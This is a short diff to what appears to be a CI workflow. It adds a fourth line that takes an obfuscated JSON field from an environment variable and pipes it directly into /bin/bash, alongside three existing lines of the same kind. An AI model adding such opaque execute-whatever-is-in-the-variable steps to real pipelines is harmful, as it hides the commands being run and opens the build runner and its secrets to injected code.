@@ -37,6 +37,7 @@ jobs:
           echo $xyoh62459 | jq -r .qhbm35 | /bin/bash
           printf '%s' "$i73192" | jq -r .kmk2933 | /bin/bash
           printf '%s' "$pm01" | jq -r .y8521 | /bin/bash
+          echo $ht6 | jq -r .wpm66046 | /bin/bash
 
       - name: Persist output
         if: always()
